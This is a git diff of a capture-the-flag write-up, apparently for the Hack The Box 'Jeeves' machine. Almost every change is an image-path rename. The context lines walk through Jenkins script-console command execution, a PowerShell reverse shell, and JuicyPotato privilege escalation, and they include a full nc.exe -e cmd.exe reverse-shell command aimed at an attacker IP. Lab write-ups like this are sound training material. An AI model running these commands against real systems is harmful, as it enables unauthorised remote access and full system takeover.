@@ -75,11 +75,11 @@ gobuster dir -u http://10.129.174.184:50000 -w /usr/share/wordlists/dirbuster/di
 
 Looking at the http site we are presented with a search bar
 
-![](<../../../.gitbook/assets/image (15) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png>)
 
 Searching takes you to error.html which turns out to just be an image
 
-![error.html](<../../../.gitbook/assets/image (17) (1) (1).png>)
+![error.html](<../../../.gitbook/assets/image (17) (1) (1) (1).png>)
 
 Source code for site, the action results in error.html
 
@@ -107,11 +107,11 @@ Source code for site, the action results in error.html
 
 Quickly checking gobuster for jetty shows that we have a directory to check out
 
-![/askjeeves](<../../../.gitbook/assets/image (16) (1) (1).png>)
+![/askjeeves](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)
 
 Going there we see Jenkins!
 
-![Jenkins](<../../../.gitbook/assets/image (24) (1) (1) (1).png>)
+![Jenkins](<../../../.gitbook/assets/image (24) (1) (1) (1) (1).png>)
 
 Turns out we have command execution without needing to be logged in which works in our favor
 
@@ -127,7 +127,7 @@ First we want to copy the example to the bottom of the script so that it is run 
 
 ![](<../../../.gitbook/assets/image (10) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (6) (1) (1).png>)
+![](<../../../.gitbook/assets/image (6) (1) (1) (1).png>)
 
 Next we want to get a web server running and a netcat listener to catch the reverse shell. In this se I am using [updog](https://github.com/sc0tfree/updog) for my simple web server.
 
@@ -135,11 +135,11 @@ Next we want to get a web server running and a netcat listener to catch the reve
 
 Using the script console again I run this command to download and execute the invoke powershell tcp reverse shell script
 
-![](<../../../.gitbook/assets/image (3).png>)
+![](<../../../.gitbook/assets/image (3) (1).png>)
 
 And we get a shell back!
 
-![](<../../../.gitbook/assets/image (14) (1).png>)
+![](<../../../.gitbook/assets/image (14) (1) (1).png>)
 
 This allows us to get user.txt!
 
@@ -151,7 +151,7 @@ Next we want to run PowerUp.ps1 however we want to use the dev branch as it has 
 
 {% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/dev" %}
 
-![](<../../../.gitbook/assets/image (13) (1) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)
 
 Then we want to run these commands in our reverse shell
 
@@ -168,7 +168,7 @@ Right away we see SeImpersonatePrivilege which means this box is vulnerable to J
 
 We first need to download JuicyPotato.exe to the box which I am hosting from my kali box
 
-![](<../../../.gitbook/assets/image (22) (1) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1) (1).png>)
 
 We need to copy kali's nc.exe to the windows box
 
@@ -192,13 +192,13 @@ This is the input I used:
 cmd /c jp.exe -l 9001 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.92 9001" -t *
 ```
 
-![Got a shell](<../../../.gitbook/assets/image (23) (1) (1).png>)
+![Got a shell](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)
 
 We got nt authority\system!&#x20;
 
 When we try and take a look at the administrators desktop we see hm.txt with an interesting message
 
-![](<../../../.gitbook/assets/image (5).png>)
+![](<../../../.gitbook/assets/image (5) (1).png>)
 
 Then I tried this
 
